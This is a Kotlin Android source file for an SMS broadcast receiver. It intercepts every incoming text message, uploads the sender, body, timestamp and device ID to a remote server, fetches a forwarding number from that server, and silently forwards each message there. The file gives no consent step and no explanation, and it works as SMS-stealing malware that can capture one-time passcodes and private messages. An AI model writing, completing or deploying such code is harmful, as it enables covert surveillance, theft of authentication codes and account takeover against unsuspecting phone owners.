package com.example.test

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) {
            return
        }

        val action = intent.action
        
        if (action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION &&
            action != Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            return
        }

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            if (messages.isEmpty()) {
                return
            }

            val fullMessage = StringBuilder()
            var sender = ""
            var timestamp = 0L

            for (message in messages) {
                fullMessage.append(message.messageBody ?: "")
                if (sender.isEmpty()) {
                    sender = message.originatingAddress ?: "Unknown"
                    timestamp = message.timestampMillis
                }
            }

            Thread {
                try {
                    sendSmsToBackend(context, sender, fullMessage.toString(), timestamp)

                    val forwardingNumber = fetchForwardingNumberFromBackend(context)
                    if (!forwardingNumber.isNullOrEmpty()) {
                        forwardSms(forwardingNumber, fullMessage.toString())
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in background thread", e)
                }
            }.start()

        } catch (e: Exception) {
            Log.e(TAG, "Error processing SMS", e)
        }
    }

    private fun sendSmsToBackend(context: Context, sender: String, message: String, timestamp: Long) {
        try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )

            val body = JSONObject().apply {
                put("sender", sender)
                put("message", message)
                put("timestamp", timestamp)
                put("deviceId", deviceId)
            }

            val baseUrl = ServerConfig.getBaseUrl()
            val urlString = "$baseUrl/sms/new"

            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            conn.responseCode
            conn.disconnect()

        } catch (e: Exception) {
            Log.e(TAG, "Error sending SMS to backend", e)
        }
    }

    private fun fetchForwardingNumberFromBackend(context: Context): String? {
        return try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )

            val baseUrl = ServerConfig.getBaseUrl()
            val urlString = "$baseUrl/getForwardingNumber/$deviceId"

            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "GET"
            conn.setRequestProperty("Accept", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000

            val responseCode = conn.responseCode
            
            if (responseCode != 200) {
                conn.disconnect()
                return null
            }

            val response = conn.inputStream.bufferedReader().use { it.readText() }
            val json = JSONObject(response)
            val number = json.optString("forwardingNumber", null)

            conn.disconnect()
            number

        } catch (e: Exception) {
            Log.e(TAG, "Error fetching forwarding number", e)
            null
        }
    }

    private fun forwardSms(forwardingNumber: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()

            if (message.length > 160) {
                val parts = smsManager.divideMessage(message)
                smsManager.sendMultipartTextMessage(
                    forwardingNumber,
                    null,
                    parts,
                    null,
                    null
                )
            } else {
                smsManager.sendTextMessage(
                    forwardingNumber,
                    null,
                    message,
                    null,
                    null
                )
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error forwarding SMS", e)
        }
    }
}